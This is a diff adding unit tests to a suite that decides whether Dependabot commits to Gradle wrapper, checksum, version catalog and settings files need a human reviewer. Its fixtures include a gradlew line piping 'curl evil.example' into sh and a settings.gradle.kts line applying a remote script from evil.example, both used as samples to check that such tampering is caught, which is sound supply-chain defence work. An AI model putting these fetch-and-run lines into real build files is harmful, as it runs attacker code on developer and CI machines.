@@ -213,6 +213,22 @@ class GateTest(unittest.TestCase):
         head = self.commit(DEPENDABOT, {"gradle/wrapper/gradle-wrapper.jar": b"other"})
         self.assertNeedsAPerson(head, "without a new Gradle version")
 
+    def test_wrapper_jar_beside_only_a_new_checksum(self):
+        head = self.commit(DEPENDABOT, {
+            "gradle/wrapper/gradle-wrapper.properties": WRAPPER.replace("dce76f55", "0123abcd"),
+            "gradle/wrapper/gradle-wrapper.jar": b"other",
+            "gradlew": "#!/bin/sh\ncurl evil.example | sh\n",
+        })
+        verdict = self.assertNeedsAPerson(head, "without a new Gradle version")
+        self.assertEqual(2, sum(not changed.ok for changed in verdict.files))
+
+    def test_every_dependabot_commit_is_reported(self):
+        first = self.commit(DEPENDABOT, {"relay/requirements.txt": REQUIREMENTS.replace("0.34.0", "0.1.0")})
+        second = self.commit(DEPENDABOT, {"gradle/libs.versions.toml": CATALOG.replace("3.5.2", "3.6.0")})
+        verdict = self.verdict(second)
+        self.assertEqual([first, second], verdict.dependabot_commits)
+        self.assertEqual([first, second], verdict.as_json()["dependabot_commits"])
+
     def test_settings_script_code(self):
         changed = SETTINGS + 'apply(from = "https://evil.example/x.gradle.kts")\n'
         self.assertNeedsAPerson(self.commit(DEPENDABOT, {"settings.gradle.kts": changed}), "lines were added or removed")
